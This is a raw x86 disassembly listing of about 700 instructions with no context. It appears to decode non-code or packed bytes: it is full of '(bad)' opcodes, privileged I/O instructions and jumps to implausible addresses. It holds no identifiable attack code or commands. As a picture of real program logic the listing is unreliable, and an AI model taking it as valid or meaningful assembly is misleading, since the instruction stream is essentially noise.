  421b53:	fimul  DWORD PTR [edx]
  421b55:	add    BYTE PTR [edi+0x65],al
  421b58:	mov    dh,0x2b
  421b5a:	cmp    DWORD PTR [eax-0x36],edx
  421b5d:	sti    
  421b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b5f:	and    eax,0xa2d98964
  421b64:	or     eax,DWORD PTR [edx*1-0x6b1896fb]
  421b6b:	or     dl,dh
  421b6d:	lods   eax,DWORD PTR ds:[esi]
  421b6e:	cld    
  421b6f:	neg    BYTE PTR [edi]
  421b71:	iret   
  421b72:	mov    dh,0x30
  421b74:	dec    edi
  421b75:	cld    
  421b76:	mov    cs,WORD PTR [ecx-0x7019e806]
  421b7c:	push   esp
  421b7d:	jmp    0x1834888f
  421b82:	cmp    DWORD PTR [ebx+0x20],eax
  421b85:	(bad)  
  421b87:	or     DWORD PTR [edi],edi
  421b89:	aam    0x2c
  421b8b:	and    al,0x2c
  421b8d:	sbb    eax,0xb4dcaab2
  421b92:	mov    BYTE PTR [esi],dh
  421b94:	stc    
  421b95:	xchg   edi,eax
  421b96:	aaa    
  421b97:	test   DWORD PTR ds:0xace78f34,esi
  421b9d:	gs mov cl,0xce
  421ba0:	pop    esi
  421ba1:	in     al,0x3c
  421ba3:	sbb    ecx,DWORD PTR [ebx-0x6b]
  421ba6:	addr16 push edi
  421ba8:	imul   esp,DWORD PTR [edx+0x75],0xf4fe4e93
  421baf:	mov    ebx,0xac512991
  421bb4:	dec    DWORD PTR [esi]
  421bb6:	arpl   WORD PTR [ebp-0x2463c5e0],di
  421bbc:	pop    DWORD PTR [esi-0x3a92c47d]
  421bc2:	pop    edi
  421bc3:	jl     0x421bb0
  421bc5:	jp     0x421c30
  421bc7:	push   ds
  421bc8:	ret    0xfc25
  421bcb:	jb     0x421c30
  421bcd:	xchg   edi,eax
  421bce:	mov    ebp,0x8bf8a8de
  421bd3:	xor    ch,BYTE PTR [esi+0x5edf4774]
  421bd9:	cmp    eax,0xb3c88bd2
  421bde:	xor    edx,DWORD PTR [esi-0x5b]
  421be1:	mov    ebp,0x73e4e681
  421be6:	push   eax
  421be7:	add    eax,0x9a3cd20
  421bec:	stos   DWORD PTR es:[edi],eax
  421bed:	jno    0x421b82
  421bef:	or     DWORD PTR [ebx+0x1],edi
  421bf2:	mov    cl,0x79
  421bf4:	jge    0x421bc1
  421bf6:	ds mov dl,0x72
  421bf9:	xchg   esi,eax
  421bfa:	xchg   ebp,eax
  421bfb:	ins    BYTE PTR es:[edi],dx
  421bfc:	jmp    0x421c6e
  421bfe:	jp     0x421c43
  421c00:	(bad)  
  421c01:	mov    esp,0x34269ed5
  421c06:	dec    ebx
  421c07:	je     0x421bb0
  421c09:	rol    ecx,0xf6
  421c0c:	mov    ds:0xd38c81d0,eax
  421c11:	pop    es
  421c12:	cmp    ch,ah
  421c14:	loop   0x421c83
  421c16:	add    al,0x17
  421c18:	xchg   edx,eax
  421c19:	(bad)  
  421c1a:	xor    dh,dl
  421c1c:	jne    0x421bcc
  421c1e:	lahf   
  421c1f:	imul   di,di,0xc10e
  421c24:	jns    0x421bbd
  421c26:	fnstsw WORD PTR [edx-0x50]
  421c29:	dec    esi
  421c2a:	inc    edx
  421c2b:	rcl    ah,0x84
  421c2e:	test   ebx,edx
  421c30:	inc    esp
  421c31:	jmp    0x7169c452
  421c36:	aas    
  421c37:	adc    BYTE PTR [eax-0x35775219],0x28
  421c3e:	test   BYTE PTR [eax+0x46],ah
  421c41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c42:	es loop 0x421c0d
  421c45:	jne    0x421c17
  421c47:	jns    0x421c9f
  421c49:	sbb    cl,BYTE PTR [edi]
  421c4b:	pop    esi
  421c4c:	inc    edi
  421c4d:	dec    eax
  421c4e:	pop    ds
  421c4f:	loope  0x421cba
  421c51:	cdq    
  421c52:	repz fdivrp st(4),st
  421c55:	pop    ecx
  421c56:	mov    ecx,0xa695fae9
  421c5b:	add    al,0x3f
  421c5d:	inc    esp
  421c5e:	scas   eax,DWORD PTR es:[edi]
  421c5f:	pop    es
  421c60:	sub    al,BYTE PTR [ecx]
  421c62:	enter  0x54f2,0xd7
  421c66:	mov    DWORD PTR [edi+0x7c12fc18],eax
  421c6c:	pop    es
  421c6d:	push   eax
  421c6e:	aaa    
  421c6f:	mov    al,ds:0xbfa6fefc
  421c74:	shl    DWORD PTR [eax+0x7615b650],cl
  421c7a:	pop    edx
  421c7b:	mov    ch,0xdd
  421c7d:	mov    al,bl
  421c7f:	and    eax,0xec69ee93
  421c84:	pop    ecx
  421c85:	in     al,0x25
  421c87:	psubb  mm3,mm3
  421c8a:	adc    BYTE PTR [ebx+0x781af454],cl
  421c90:	xchg   edi,eax
  421c91:	sbb    esp,ecx
  421c93:	retf   
  421c94:	in     eax,0xf3
  421c96:	cmc    
  421c97:	pop    ds
  421c98:	popf   
  421c99:	rcr    edx,0xb4
  421c9c:	sbb    DWORD PTR [esi-0x13fb28ac],ebp
  421ca2:	repnz ss dec ebx
  421ca5:	fistp  WORD PTR [esi+0x2]
  421ca8:	adc    BYTE PTR [esi],0xcf
  421cab:	push   ebx
  421cac:	mov    edi,DWORD PTR [esi+0x1e]
  421caf:	cmp    edi,eax
  421cb1:	arpl   cx,cx
  421cb3:	mov    WORD PTR [edx],es
  421cb5:	dec    edi
  421cb6:	(bad)  
  421cb7:	ja     0x421c61
  421cb9:	call   0xeb7b306e
  421cbe:	push   cs
  421cbf:	or     al,0x39
  421cc1:	push   esp
  421cc2:	fwait
  421cc3:	xor    ecx,ebx
  421cc5:	and    eax,DWORD PTR [eax+0x64]
  421cc8:	mov    bl,0x8
  421cca:	dec    ebx
  421ccb:	pop    ebx
  421ccc:	or     ch,BYTE PTR cs:[esi+0x6edc6c05]
  421cd3:	pop    ecx
  421cd4:	or     eax,0x6e97973b
  421cd9:	mov    DWORD PTR [edx-0x4e],edi
  421cdc:	ins    BYTE PTR es:[edi],dx
  421cdd:	dec    esi
  421cde:	les    ebp,FWORD PTR [edi+0x12]
  421ce1:	inc    ecx
  421ce2:	loope  0x421c9b
  421ce4:	pop    ebx
  421ce5:	push   edi
  421ce6:	sti    
  421ce7:	or     edi,0xffffffed
  421cea:	jmp    0x74614c5c
  421cef:	jmp    0x421d4c
  421cf1:	adc    cl,BYTE PTR gs:[ecx]
  421cf4:	adc    ebx,DWORD PTR [ebx+0x4129b1be]
  421cfa:	inc    ebp
  421cfb:	cmp    DWORD PTR [ecx],ebx
  421cfd:	lahf   
  421cfe:	push   ss
  421cff:	push   ecx
  421d00:	or     bl,BYTE PTR [eax+esi*4+0x5f]
  421d04:	add    ebp,DWORD PTR [esp-0x1f]
  421d08:	imul   edi,DWORD PTR [eax+0x1e3217ec],0xfffffff8
  421d0f:	sbb    al,0xe1
  421d11:	jle    0x421d3c
  421d13:	stos   DWORD PTR es:[edi],eax
  421d14:	and    bh,BYTE PTR [eax+ebp*4+0x78]
  421d18:	test   dl,0x23
  421d1b:	repz test al,0x59
  421d1e:	lods   eax,DWORD PTR ds:[esi]
  421d1f:	push   edx
  421d20:	and    DWORD PTR ss:[ebp+0x23],ebp
  421d24:	popa   
  421d25:	cwde   
  421d26:	jae    0x421d64
  421d28:	aaa    
  421d29:	retf   
  421d2a:	inc    ebx
  421d2b:	mov    ch,0x91
  421d2d:	xchg   edx,eax
  421d2e:	dec    ebx
  421d2f:	or     cl,BYTE PTR [ebp+0x78]
  421d32:	stc    
  421d33:	fidivr WORD PTR [esi]
  421d35:	fdiv   st,st(6)
  421d37:	lods   eax,DWORD PTR ds:[esi]
  421d38:	(bad)  
  421d3a:	arpl   cx,di
  421d3c:	cld    
  421d3d:	or     eax,0x4a52e6a2
  421d42:	and    bh,ah
  421d44:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  421d46:	sbb    eax,0xaa147f26
  421d4b:	pop    es
  421d4c:	in     eax,dx
  421d4d:	or     ah,BYTE PTR [ebx+ebx*4-0x476d3caa]
  421d54:	cld    
  421d55:	push   0x1e
  421d57:	out    dx,eax
  421d58:	jnp    0x421d2d
  421d5a:	pop    ebp
  421d5b:	sahf   
  421d5c:	aas    
  421d5d:	mov    dh,0x3
  421d5f:	shr    DWORD PTR [ecx+0x72],1
  421d62:	and    DWORD PTR [ebx-0x54],esp
  421d65:	loope  0x421d1b
  421d67:	jo     0x421d9e
  421d69:	mov    dh,0x68
  421d6b:	repz retf 
  421d6d:	repz imul esp,ecx,0xf
  421d71:	test   al,0xaf
  421d73:	jge    0x421de0
  421d75:	div    BYTE PTR [ebp+edx*8+0x6c]
  421d79:	popf   
  421d7a:	push   edi
  421d7b:	ret    
  421d7c:	push   edi
  421d7d:	popf   
  421d7e:	push   esp
  421d7f:	jb     0x421dd9
  421d81:	fisubr DWORD PTR [esp+ebx*1-0x4e21e58]
  421d88:	and    eax,0x5a10a93f
  421d8d:	sahf   
  421d8e:	push   ss
  421d8f:	data16 fiadd DWORD PTR [eax]
  421d92:	retf   
  421d93:	out    dx,eax
  421d94:	gs clc 
  421d96:	adc    DWORD PTR [esi-0x36adb148],edi
  421d9c:	xchg   edx,eax
  421d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d9e:	sahf   
  421d9f:	adc    eax,esp
  421da1:	mov    cl,0x71
  421da3:	out    0xfb,eax
  421da5:	dec    edx
  421da6:	int3   
  421da7:	fwait
  421da8:	xor    eax,0xf19c1ba0
  421dad:	fstp   TBYTE PTR [eax-0x26077561]
  421db3:	mov    esp,DWORD PTR [edi]
  421db5:	sbb    esi,edx
  421db7:	sar    BYTE PTR [eax+0x33529eb3],cl
  421dbd:	imul   ecx,DWORD PTR [ebx+0x55784f0f],0x4d79903a
  421dc7:	aad    0x6b
  421dc9:	popf   
  421dca:	sbb    edx,edi
  421dcc:	sahf   
  421dcd:	cmp    al,0xcc
  421dcf:	test   BYTE PTR cs:[edi+ebx*4-0x24],cl
  421dd4:	cld    
  421dd5:	mov    ecx,0xc2f02c46
  421dda:	mov    esi,0x6cfcb059
  421ddf:	je     0x421e4d
  421de1:	daa    
  421de2:	out    0x4c,al
  421de4:	sti    
  421de5:	pop    esp
  421de6:	and    al,0x6e
  421de8:	outs   dx,BYTE PTR ds:[esi]
  421de9:	push   0xffffffc8
  421deb:	leave  
  421dec:	loopne 0x421e50
  421dee:	mov    bh,0x9d
  421df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421df1:	retf   
  421df2:	add    DWORD PTR [ebx],esi
  421df4:	data16 fidiv WORD PTR [ecx+0x1217ece1]
  421dfb:	out    0xf4,eax
  421dfd:	pop    ebx
  421dfe:	pop    ecx
  421dff:	sub    ebx,eax
  421e01:	cwde   
  421e02:	push   ds
  421e03:	pop    ebx
  421e04:	mov    ds:0x46c69925,al
  421e09:	imul   eax,DWORD PTR [edi+0x3529af96],0x38
  421e10:	mov    esi,edx
  421e12:	or     edi,DWORD PTR [esp+edi*1-0x7c97e267]
  421e19:	fcmove st,st(6)
  421e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e1c:	push   ebx
  421e1d:	mov    eax,ds:0x9d0bd971
  421e22:	cmp    al,0x48
  421e24:	test   eax,0xe0d6f52
  421e29:	sub    DWORD PTR [edx],ebx
  421e2b:	(bad)  
  421e2c:	sub    eax,0xa6dffa07
  421e31:	dec    ebx
  421e32:	adc    esi,edi
  421e34:	xor    ecx,DWORD PTR ds:0x4810abb5
  421e3a:	pushf  
  421e3b:	scas   eax,DWORD PTR es:[edi]
  421e3c:	loopne 0x421e99
  421e3e:	(bad)  
  421e3f:	xchg   ebx,eax
  421e40:	cmp    ebx,ebx
  421e42:	xor    ch,bh
  421e44:	ds jp  0x421e71
  421e47:	cmp    eax,0xccc2d4e9
  421e4c:	sbb    ecx,DWORD PTR [ebx-0x29dc4321]
  421e52:	xchg   ecx,eax
  421e53:	mov    ds:0xf185e007,eax
  421e58:	pop    edi
  421e59:	xchg   edx,eax
  421e5a:	idiv   DWORD PTR [ebp-0x7060d568]
  421e60:	adc    edi,DWORD PTR [ecx]
  421e62:	jmp    0x1ec3ea31
  421e67:	adc    al,0xc0
  421e69:	in     al,0xb4
  421e6b:	test   BYTE PTR [ebx],cl
  421e6d:	fs cwde 
  421e6f:	bound  eax,QWORD PTR [ecx]
  421e71:	jmp    0x421e6b
  421e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e74:	push   edi
  421e75:	jg     0x421e97
  421e77:	or     ch,BYTE PTR [edi+0x64]
  421e7a:	jge    0x421eaa
  421e7c:	mov    al,ds:0x9fba089b
  421e81:	repz jae 0x421ed5
  421e84:	ss jmp 0x9399550d
  421e8a:	lahf   
  421e8b:	xchg   ebp,eax
  421e8c:	loope  0x421e4c
  421e8e:	jne    0x421ed9
  421e90:	or     esp,DWORD PTR [edx+0x4e6c1e3f]
  421e96:	ss out 0xad,al
  421e99:	xchg   esi,eax
  421e9a:	sbb    BYTE PTR [esi-0x59],0xe7
  421e9e:	mov    ecx,0x9bce1ce4
  421ea3:	gs cdq 
  421ea5:	mov    edx,0xc7cc0041
  421eaa:	mov    WORD PTR [ebp+eiz*2-0x51],ds
  421eae:	inc    ebp
  421eaf:	sbb    BYTE PTR [ebx-0x21f59fca],cl
  421eb5:	pcmpgtb mm0,mm5
  421eb8:	or     ah,BYTE PTR [esi+eax*1+0x3e]
  421ebc:	rcl    BYTE PTR [eax],1
  421ebe:	iret   
  421ebf:	cmp    BYTE PTR [esi-0x1028dee7],ch
  421ec5:	cmp    eax,0x1502fdba
  421eca:	cmp    eax,0x1111d669
  421ecf:	inc    eax
  421ed0:	push   es
  421ed1:	mov    dh,0x63
  421ed3:	shl    BYTE PTR [edi+ebp*8+0x61265cdf],0x80
  421edb:	test   eax,0x78d6c93d
  421ee0:	or     esi,DWORD PTR [ebx]
  421ee2:	fcomi  st,st(1)
  421ee4:	lods   al,BYTE PTR ds:[esi]
  421ee5:	push   eax
  421ee6:	pop    ebp
  421ee7:	or     eax,0xc5165499
  421eec:	mov    ss,WORD PTR [ebp+0x2]
  421eef:	retf   0x46ce
  421ef2:	dec    edi
  421ef3:	retf   
  421ef4:	js     0x421ef9
  421ef6:	cmp    eax,0x8e2cbe94
  421efb:	dec    edx
  421efc:	inc    BYTE PTR [ebp-0x5731f5bc]
  421f02:	in     eax,0x8
  421f04:	or     al,0x57
  421f06:	or     DWORD PTR [edi],edx
  421f08:	push   esi
  421f09:	dec    esp
  421f0a:	jecxz  0x421f3f
  421f0c:	or     dl,BYTE PTR [esi]
  421f0e:	(bad)  
  421f10:	mov    cs,esp
  421f12:	xor    al,0x5b
  421f14:	dec    ecx
  421f15:	ficom  WORD PTR [ebx]
  421f17:	fwait
  421f18:	adc    al,0x3d
  421f1a:	out    dx,eax
  421f1b:	mov    al,0x2e
  421f1d:	rcr    DWORD PTR [eax+0xa684442],cl
  421f23:	push   ss
  421f24:	pop    ecx
  421f25:	clc    
  421f26:	xor    DWORD PTR [ecx+ebx*4-0x79475b12],ebp
  421f2d:	hlt    
  421f2e:	fidivr DWORD PTR [ebp-0xd4ea3f9]
  421f34:	jge    0x421f89
  421f36:	shr    BYTE PTR [edx+0x3e],0xd8
  421f3a:	add    DWORD PTR [edx-0x4e6c7aaa],0xffffffbf
  421f41:	stos   BYTE PTR es:[edi],al
  421f42:	mov    ch,0x7b
  421f44:	pop    esp
  421f45:	mov    WORD PTR [ebx],ss
  421f47:	and    al,0xcc
  421f49:	lods   eax,DWORD PTR ds:[esi]
  421f4a:	jmp    0x153d17ff
  421f4f:	idiv   DWORD PTR ds:0x60fcbedb
  421f55:	stc    
  421f56:	enter  0x715f,0xa1
  421f5a:	mov    eax,0x923705c4
  421f5f:	xor    BYTE PTR [ecx+esi*1-0x44e42fbf],bh
  421f66:	pop    ss
  421f67:	ja     0x421fc4
  421f69:	mov    BYTE PTR [ebp+0x599584d2],dl
  421f6f:	sar    esp,1
  421f71:	lahf   
  421f72:	std    
  421f73:	pushf  
  421f74:	fnsave [edi]
  421f76:	xchg   ebx,eax
  421f77:	mov    al,ds:0x15a14cd8
  421f7c:	test   BYTE PTR [ebp-0x244a3943],al
  421f82:	rcr    DWORD PTR [ecx+eax*2],0x4d
  421f86:	pop    edx
  421f87:	icebp  
  421f88:	lds    esi,FWORD PTR ds:0x5642e22d
  421f8e:	xor    al,BYTE PTR [edi]
  421f90:	push   ebp
  421f91:	dec    ebp
  421f92:	enter  0x41fd,0x8
  421f96:	inc    edi
  421f97:	in     al,0x4
  421f99:	pop    ds
  421f9a:	pop    esi
  421f9b:	les    ecx,FWORD PTR [ecx-0x610da104]
  421fa1:	shr    BYTE PTR [ebp-0x45],1
  421fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fa5:	shl    eax,1
  421fa7:	sbb    cl,BYTE PTR ds:0xe32373eb
  421fad:	pop    edx
  421fae:	sub    eax,0xcc15a8ad
  421fb3:	jg     0x421f41
  421fb5:	les    ebp,FWORD PTR [edi-0x4a18be5f]
  421fbb:	fst    st(2)
  421fbd:	lods   eax,DWORD PTR ds:[esi]
  421fbe:	jns    0x422031
  421fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fc1:	out    dx,eax
  421fc2:	push   esi
  421fc3:	sub    BYTE PTR [edx-0x448acbd2],dh
  421fc9:	dec    edi
  421fca:	and    bh,BYTE PTR es:[esi+0x333f3aba]
  421fd1:	add    eax,0x72f460af
  421fd6:	or     DWORD PTR [ebp-0x80],ecx
  421fd9:	out    0xb,al
  421fdb:	gs push ds
  421fdd:	mov    ds:0xe35b8f0e,eax
  421fe2:	addr16 popw ds
  421fe5:	xor    eax,0xb54fce93
  421fea:	dec    edx
  421feb:	adc    eax,0x90423dd9
  421ff0:	cli    
  421ff1:	jmp    0x421fc7
  421ff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ff4:	pop    ss
  421ff5:	pop    esi
  421ff6:	sahf   
  421ff7:	cdq    
  421ff8:	div    bh
  421ffa:	in     eax,dx
  421ffb:	sub    al,0xd9
  421ffd:	and    eax,0xbe6ca711
  422002:	jns    0x42202b
  422004:	dec    ecx
  422005:	jg     0x421fc5
  422007:	ss std 
  422009:	push   ebx
  42200a:	inc    ebx
  42200b:	mov    ebx,DWORD PTR [edx-0x5e]
  42200e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42200f:	sub    al,0xb1
  422011:	fmul   st(0),st
  422013:	mov    al,0x91
  422015:	jno    0x422012
  422017:	adc    al,0xc7
  422019:	mov    ss,WORD PTR [edx+0x3d]
  42201c:	ja     0x422070
  42201e:	dec    eax
  42201f:	jb     0x422035
  422021:	das    
  422022:	jno    0x421ff7
  422024:	dec    esp
  422025:	cmp    al,BYTE PTR [edi]
  422027:	jae    0x422087
  422029:	clc    
  42202a:	cdq    
  42202b:	sub    eax,0x1c480043
  422030:	sub    eax,0x4fa4da07
  422035:	loop   0x422074
  422037:	neg    dh
  422039:	xor    BYTE PTR [edx],dl
  42203b:	adc    DWORD PTR [eax+0x27],eax
  42203e:	dec    eax
  42203f:	popa   
  422040:	test   DWORD PTR [edx+0x2b],0x6b7f8ade
  422047:	cdq    
  422048:	call   0x82ea02c1
  42204d:	add    al,0xb2
  42204f:	push   eax
  422050:	jle    0x42200c
  422052:	dec    edx
  422053:	out    0x60,eax
  422055:	ds ret 
  422057:	shl    DWORD PTR ds:0x7b8695fb,1
  42205d:	add    bh,BYTE PTR [ecx+0x55]
  422060:	cmp    al,0xb8
  422062:	push   esp
  422063:	rcr    esi,cl
  422065:	xchg   ecx,eax
  422066:	pop    ds
  422067:	xchg   BYTE PTR [ebx],bh
  422069:	jo     0x422086
  42206b:	push   0x3be97509
  422070:	(bad)  
  422072:	out    dx,eax
  422073:	sahf   
  422074:	push   cs
  422075:	push   edi
  422076:	cmp    dh,BYTE PTR [edi+0x18]
  422079:	in     al,dx
  42207a:	jl     0x4220e4
  42207c:	cld    
  42207d:	dec    edi
  42207e:	rsm    
  422080:	mov    bh,BYTE PTR [edi+ebp*1]
  422083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422084:	(bad)  
  422085:	jae    0x42203f
  422087:	push   eax
  422088:	adc    al,0x51
  42208a:	dec    ecx
  42208b:	add    BYTE PTR [edi],ch
  42208d:	test   DWORD PTR [esi+0x71],0x8c886141
  422094:	sahf   
  422095:	cmp    cl,bl
  422097:	mov    eax,ds:0x416d58c5
  42209c:	adc    BYTE PTR [ebp+0xb],dh
  42209f:	mov    ch,BYTE PTR [edx+edx*4]
  4220a2:	in     al,0xf
  4220a4:	mov    ebx,ecx
  4220a6:	in     al,0xe7
  4220a8:	(bad)  
  4220a9:	call   0x95d95f3f
  4220ae:	pop    ebx
  4220af:	ret    0xe15e
  4220b2:	jecxz  0x422058
  4220b4:	push   ss
  4220b5:	mov    esp,edi
  4220b7:	jne    0x42209d
  4220b9:	sahf   
  4220ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220bc:	mov    dh,0x80
  4220be:	mov    bh,0x8c
  4220c0:	or     BYTE PTR [esi+ebx*1+0x2d36e4a7],al
  4220c7:	and    ebp,ecx
  4220c9:	(bad)  
  4220ca:	jle    0x422107
  4220cc:	lea    ebx,[ecx-0x5e]
  4220cf:	test   al,0x24
  4220d1:	push   edi
  4220d2:	xor    dl,BYTE PTR [esi]
  4220d4:	nop
  4220d5:	loopne 0x4220a9
  4220d7:	cmp    al,0x7e
  4220d9:	clc    
  4220da:	in     al,0xfd
  4220dc:	dec    edx
  4220dd:	repz xchg esp,eax
  4220df:	cmc    
  4220e0:	and    dh,BYTE PTR [eax]
  4220e2:	jo     0x42209e
  4220e4:	and    al,0x72
  4220e6:	in     eax,0x54
  4220e8:	jge    0x42213e
  4220ea:	add    dh,BYTE PTR [ecx]
  4220ec:	push   esi
  4220ed:	dec    eax
  4220ee:	mov    ah,0x2e
  4220f0:	sbb    al,0x7e
  4220f2:	mov    WORD PTR [edx],cs
  4220f4:	pusha  
  4220f5:	sbb    eax,0xf1b4b987
  4220fa:	rcr    BYTE PTR [esi+eax*8+0x4162a6d6],0x81
  422102:	bound  ecx,QWORD PTR [ebp+ebp*4-0x3ba3af37]
  422109:	push   eax
  42210a:	outs   dx,DWORD PTR ds:[esi]
  42210b:	psubq  mm6,QWORD PTR [edi+edx*8-0x6eb95f25]
  422113:	cmp    ebx,esi
  422115:	sbb    eax,0x382b2e0d
  42211a:	mov    ah,0x90
  42211c:	out    dx,eax
  42211d:	mov    ds:0x37cebb79,al
  422122:	cmp    cl,BYTE PTR [ecx]
  422124:	jecxz  0x4220ff
  422126:	xor    al,0x59
  422128:	fmul   QWORD PTR [esi+0x6e910b26]
  42212e:	add    DWORD PTR [edi-0x2399c365],eax
  422134:	ret    
  422135:	fbstp  TBYTE PTR [edx]
  422137:	shl    BYTE PTR [esi-0x3f],1
  42213a:	addr16 push ebx
  42213c:	sbb    edi,eax
  42213e:	cmp    edx,DWORD PTR [edi]
  422140:	add    ebx,ecx
  422142:	(bad)  
  422143:	mov    ecx,0x793081e0
  422148:	ret    0x36
  42214b:	sub    BYTE PTR [ecx],dl
  42214d:	lock enter 0x431f,0xf3
  422152:	sub    edi,DWORD PTR [ecx+0x7881ff0c]
  422158:	push   0x2
  42215a:	test   esp,edi
  42215c:	mov    ah,0xf5
  42215e:	jg     0x422105
  422160:	pop    esp
  422161:	scas   eax,DWORD PTR es:[edi]
  422162:	pushf  
  422163:	sub    al,0xff
  422165:	ret    
  422166:	outs   dx,BYTE PTR ds:[esi]
  422167:	add    DWORD PTR ds:0xcbeeda75,0x5f
  42216e:	push   eax
  42216f:	aam    0x19
  422171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422172:	fwait
  422173:	sub    esi,ebx
  422175:	cmp    al,0xc3
  422177:	scas   al,BYTE PTR es:[edi]
  422178:	mov    ch,ah
  42217a:	xchg   edx,eax
  42217b:	lods   eax,DWORD PTR ds:[esi]
  42217c:	fild   DWORD PTR [ecx+0x24]
  42217f:	or     al,dl
  422181:	push   esp
  422182:	add    al,0x6f
  422184:	scas   al,BYTE PTR es:[edi]
  422185:	cmp    edi,DWORD PTR [eiz*4+0x72c59f8c]
  42218c:	push   0x5f
  42218e:	pop    ss
  42218f:	adc    eax,0x4afff965
  422194:	aas    
  422195:	test   al,0x78
  422197:	frstor [ebp+ecx*1-0x7c]
  42219b:	js     0x422123
  42219d:	adc    BYTE PTR [edx+0x3387d408],dl
  4221a3:	lea    esp,[eax-0x7f8633ec]
  4221a9:	jmp    0x422132
  4221ab:	lea    edi,[ecx+0xa]
  4221ae:	daa    
  4221af:	jl     0x4221b5
  4221b1:	push   ss
  4221b2:	jae    0x4221cb
  4221b4:	xor    al,0xdc
  4221b6:	cwde   
  4221b7:	xchg   esi,eax
  4221b8:	cs das 
  4221ba:	pop    es
  4221bb:	repz jge 0x422208
  4221be:	test   DWORD PTR [eax-0x33],edx
  4221c1:	repz cmp BYTE PTR ds:0xffb665ac,bl
  4221c8:	xor    BYTE PTR [esi+ebp*4-0x5483da32],dl
  4221cf:	and    BYTE PTR [esi],cl
  4221d1:	scas   eax,DWORD PTR es:[edi]
  4221d2:	and    DWORD PTR [edx+esi*1],edi
  4221d5:	stos   DWORD PTR es:[edi],eax
  4221d6:	call   0x4adf97cb
  4221db:	xchg   DWORD PTR [ebx+0x32704204],esi
  4221e1:	fiadd  DWORD PTR [ecx+0x15]
  4221e4:	push   edx
  4221e5:	mov    es,WORD PTR [esi+ebp*1]
  4221e8:	outs   dx,DWORD PTR ds:[esi]
  4221e9:	cli    
  4221ea:	call   0x10ff:0x2d4a6635
  4221f1:	sbb    ecx,DWORD PTR [eax+0x1b76b464]
  4221f7:	shrd   ebx,ecx,0x3e
  4221fb:	mov    eax,ds:0x3eeca639
  422200:	jp     0x4221b8
  422202:	push   es
  422203:	rol    BYTE PTR [edx+0x3183ba6e],cl
  422209:	aas    
  42220a:	and    dl,dh
  42220c:	push   edi
  42220d:	in     al,dx
  42220e:	repnz inc eax
  422210:	fcom   QWORD PTR [eax+eiz*1]
  422213:	xor    DWORD PTR [ebx],esp
  422215:	xchg   ebx,eax
  422216:	dec    esp
  422217:	cmp    ch,bl
  422219:	cs aaa 
  42221b:	out    dx,eax
  42221c:	or     bl,ch
  42221e:	jbe    0x42225d
  422220:	into   
  422221:	hlt    
  422222:	mov    bh,0x8e
  422224:	jnp    0x4221bc
  422226:	adc    eax,DWORD PTR [esi]
  422228:	(bad)  
  422229:	cli    
  42222a:	lods   al,BYTE PTR ds:[esi]
  42222b:	or     DWORD PTR [edi],edx
  42222d:	stos   DWORD PTR es:[edi],eax
  42222e:	lock push ebp
  422230:	les    esi,FWORD PTR [edx]
  422232:	std    
  422233:	scas   eax,DWORD PTR es:[edi]
  422234:	inc    edi
  422235:	push   0xffffff81
  422237:	pop    ecx
  422238:	in     al,0xd9
  42223a:	dec    ecx
  42223b:	xor    BYTE PTR cs:[esp+edx*8],cl
  42223f:	mov    esi,0x909328e8
  422244:	jg     0x42225a
  422246:	jno    0x42222c
  422248:	sub    al,0x70
  42224a:	xchg   edx,eax
  42224b:	nop
  42224c:	hlt    
  42224d:	jne    0x422267
  42224f:	xor    ebp,DWORD PTR [edi+0x2927e3b4]
  422255:	pop    ebp
  422256:	sbb    bl,BYTE PTR ds:0x85b0cb5f
  42225c:	je     0x42220d
  42225e:	jno    0x4222a2
  422260:	es xchg esp,eax
  422262:	inc    esp
  422263:	or     eax,0xf00bba66
  422268:	adc    BYTE PTR [esi-0x67cdbcd6],0x9e
  42226f:	or     dl,BYTE PTR [eax+0x1b]
  422272:	dec    esp
  422273:	sbb    al,0xbc
  422275:	cdq    
  422276:	jl     0x422212
  422278:	xor    eax,0x81239921
  42227d:	jecxz  0x4222ce
  42227f:	dec    ebp
  422280:	push   es
  422281:	push   ebx
  422282:	std    
  422283:	xor    al,0x5c
  422285:	in     eax,0x92
  422287:	sub    DWORD PTR [edx+0x46f018c7],edi
  42228d:	dec    sp
  42228f:	sti    
  422290:	fild   QWORD PTR [esi-0x7]
  422293:	xchg   esi,eax
  422294:	pop    ss
  422295:	icebp  
  422296:	and    DWORD PTR [ecx+0x56ee79af],ebx
  42229c:	add    BYTE PTR [eax-0x31],ah
  42229f:	cli    
  4222a0:	fwait
  4222a1:	mov    ds:0x50662c6f,al
  4222a6:	cwde   
  4222a7:	xchg   ebx,eax
  4222a8:	std    
  4222a9:	pop    ds
  4222aa:	mov    bl,0xd6
  4222ac:	sub    bh,BYTE PTR [ecx+0x7fd97898]
  4222b2:	jo     0x4222d1
  4222b4:	inc    eax
  4222b5:	and    edx,ebp
  4222b7:	es mov al,0xbd
  4222ba:	popa   
  4222bb:	scas   eax,DWORD PTR es:[edi]
  4222bc:	push   ebx
  4222bd:	xchg   BYTE PTR [edi-0x6b],dh
  4222c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222c1:	adc    DWORD PTR [esi],ebp
  4222c3:	es or  al,0x12
  4222c6:	inc    ebp
  4222c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222c8:	not    DWORD PTR [esp+ecx*1]
  4222cb:	xor    edi,ecx
  4222cd:	xchg   edx,eax
  4222ce:	jp     0x422311
  4222d0:	call   0xc1c9:0xfe2741ed
  4222d7:	jne    0x4222b1
  4222d9:	sub    edi,DWORD PTR [edi]
  4222db:	sub    BYTE PTR [ecx+0x35196e0d],al
  4222e1:	mov    ecx,0x4efd6dd1
  4222e6:	ins    BYTE PTR es:[edi],dx
